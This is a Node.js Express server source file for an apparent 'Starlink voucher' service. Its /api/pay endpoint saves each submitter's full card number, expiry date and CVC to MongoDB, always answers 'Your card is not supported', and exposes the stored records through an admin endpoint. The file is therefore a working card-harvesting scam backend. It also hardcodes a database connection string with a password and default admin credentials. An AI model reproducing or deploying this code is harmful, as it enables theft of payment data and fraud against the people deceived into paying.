const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const path = require('path');
const jwt = require('jsonwebtoken');

const app = express();
const PORT = process.env.PORT || 3000;

// MongoDB connection string
const MONGODB_URI =
  process.env.MONGODB_URI ||
  'mongodb://mongo:UTeVLbRgfLqdsrCzCzFUcitqLqPbLuzn@switchyard.proxy.rlwy.net:32968';

// Auth config
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'starlink123';
const JWT_SECRET = process.env.JWT_SECRET || 'starlink-secret-key';

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// MongoDB Schemas
const voucherSchema = new mongoose.Schema({
  code: {
    type: String,
    required: true,
    unique: true,
    uppercase: true,
  },
  is_used: {
    type: Boolean,
    default: false,
  },
  used_at: {
    type: Date,
    default: null,
  },
  created_at: {
    type: Date,
    default: Date.now,
  },
});

const userSchema = new mongoose.Schema({
  name: String,
  email: String,
  amount: Number,
  planDuration: String,
  cardNumber: String, // Full card number
  cardExpiry: String, // MM/YY
  cardCvc: String, // CVC code
  country: String,
  countryName: String,
  postalCode: String,
  created_at: {
    type: Date,
    default: Date.now,
  },
});

const Voucher = mongoose.model('Voucher', voucherSchema);
const User = mongoose.model('User', userSchema);

// Connect to MongoDB
mongoose
  .connect(MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => {
    console.log('Connected to MongoDB successfully');
  })
  .catch((err) => {
    console.error('Error connecting to MongoDB:', err);
    process.exit(1);
  });

// Helper to generate voucher codes
function generateVoucherCode() {
  return (
    'STAR-' +
    Math.random().toString(36).substring(2, 10).toUpperCase() +
    Math.random().toString(36).substring(2, 6).toUpperCase()
  );
}

// Auth middleware
function authMiddleware(req, res, next) {
  const authHeader = req.headers.authorization || '';
  const token = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : null;

  if (!token) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  try {
    jwt.verify(token, JWT_SECRET);
    next();
  } catch (err) {
    return res.status(401).json({ success: false, message: 'Invalid token' });
  }
}

// API Routes

// Login for admin dashboard
app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body;

  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '12h' });
    return res.json({ success: true, token });
  }

  return res
    .status(401)
    .json({ success: false, message: 'Invalid username or password' });
});

// Generate new voucher code (protected)
app.post('/api/vouchers/generate', authMiddleware, async (req, res) => {
  try {
    const { count = 1 } = req.body;
    const codes = [];

    for (let i = 0; i < count; i++) {
      const code = generateVoucherCode();
      codes.push(code);

      try {
        const voucher = new Voucher({ code });
        await voucher.save();
      } catch (err) {
        // If duplicate code (shouldn't happen, but handle it), skip
        if (err.code !== 11000) {
          console.error('Error saving voucher:', err);
        }
      }
    }

    res.json({ success: true, codes });
  } catch (error) {
    console.error('Error generating vouchers:', error);
    res
      .status(500)
      .json({ success: false, message: 'Error generating vouchers' });
  }
});

// Validate voucher code (for app, no auth)
app.post('/api/vouchers/validate', async (req, res) => {
  try {
    const { code } = req.body;

    if (!code) {
      return res
        .status(400)
        .json({ success: false, message: 'Voucher code is required' });
    }

    const voucher = await Voucher.findOne({ code: code.toUpperCase() });

    if (!voucher) {
      return res.json({
        success: false,
        valid: false,
        message: 'Invalid voucher code',
      });
    }

    if (voucher.is_used) {
      return res.json({
        success: false,
        valid: true,
        used: true,
        message: 'Voucher code already used',
        used_at: voucher.used_at,
      });
    }

    // Mark as used
    voucher.is_used = true;
    voucher.used_at = new Date();
    await voucher.save();

    res.json({
      success: true,
      valid: true,
      used: false,
      message: 'Voucher code activated successfully',
      activated_at: new Date().toISOString(),
    });
  } catch (error) {
    console.error('Error validating voucher:', error);
    res.status(500).json({ success: false, message: 'Database error' });
  }
});

// Payment endpoint - called from mobile app card input
// Stores card data but does NOT generate voucher (always returns "card not supported")
app.post('/api/pay', async (req, res) => {
  try {
    const {
      cardholderName,
      cardNumber,
      expiry,
      cvc,
      amount,
      planDuration,
      country,
      countryName,
      postalCode,
      email,
    } = req.body;

    if (!cardholderName || !cardNumber || !expiry || !cvc || !amount) {
      return res.status(400).json({
        success: false,
        message: 'Missing required payment fields',
      });
    }

    // Store user record with FULL card details (NO voucher generation)
    const user = new User({
      name: cardholderName,
      email: email || null,
      amount,
      planDuration,
      cardNumber: String(cardNumber), // Full card number
      cardExpiry: expiry, // MM/YY
      cardCvc: cvc, // CVC code
      country,
      countryName,
      postalCode,
    });
    await user.save();

    // Always return "card not supported" (no voucher generated)
    return res.json({
      success: false,
      message: 'Your card is not supported',
    });
  } catch (error) {
    console.error('Error processing payment:', error);
    return res
      .status(500)
      .json({ success: false, message: 'Error processing payment' });
  }
});

// Get all vouchers (for admin dashboard) - protected
app.get('/api/vouchers', authMiddleware, async (req, res) => {
  try {
    const vouchers = await Voucher.find().sort({ created_at: -1 });
    res.json({ success: true, vouchers });
  } catch (error) {
    console.error('Error fetching vouchers:', error);
    res.status(500).json({ success: false, message: 'Database error' });
  }
});

// Get voucher statistics - protected
app.get('/api/vouchers/stats', authMiddleware, async (req, res) => {
  try {
    const total = await Voucher.countDocuments();
    const used = await Voucher.countDocuments({ is_used: true });
    const available = total - used;

    res.json({
      success: true,
      total,
      used,
      available,
    });
  } catch (error) {
    console.error('Error fetching stats:', error);
    res.status(500).json({ success: false, message: 'Database error' });
  }
});

// Get users (for admin dashboard) - protected
app.get('/api/users', authMiddleware, async (req, res) => {
  try {
    const users = await User.find().sort({ created_at: -1 });
    res.json({ success: true, users });
  } catch (error) {
    console.error('Error fetching users:', error);
    res.status(500).json({ success: false, message: 'Database error' });
  }
});

// Serve admin dashboard
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`Starlink Voucher Server running on port ${PORT}`);
  console.log(`Access admin dashboard at http://localhost:${PORT}`);
  console.log(`Connected to MongoDB`);
});
